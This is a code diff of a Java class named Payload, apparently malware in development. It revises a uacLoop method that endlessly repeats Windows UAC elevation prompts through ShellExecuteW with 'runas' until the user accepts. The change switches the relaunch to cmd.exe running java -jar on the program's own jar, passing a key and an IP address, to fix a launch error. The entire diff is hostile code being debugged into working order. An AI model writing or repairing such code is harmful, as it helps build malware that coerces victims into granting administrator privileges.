@@ -51,21 +51,20 @@ public class Payload {
 
     private static void uacLoop(String key, String ip) {
         try {
-            // Use the exact path from java.home and ensure it's absolute
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
-            String javaw = javaHome + "\\bin\\javaw.exe";
-            String javaBinDir = javaHome + "\\bin";
-            
+            String javaExe = javaHome + "\\bin\\java.exe"; 
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             
-            log("javaw: " + javaw);
+            log("java: " + javaExe);
             log("jar: " + jarPath);
+
+            // Use cmd.exe /c to launch it, which fixes the "Code 2" file-not-found issue
+            String cmdArgs = String.format("/c \"\"%s\" -jar \"%s\" %s %s\"", javaExe, jarPath, key, ip);
 
             while (true) {
                 log("Triggering UAC...");
-                // Pass javaBinDir as the lpDirectory parameter to fix "Code: 2" (File not found)
                 int result = Shell32.INSTANCE.ShellExecuteW(
-                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, javaBinDir, 1
+                    null, "runas", "cmd.exe", cmdArgs, null, 1
                 );
 
                 if (result > 32) {
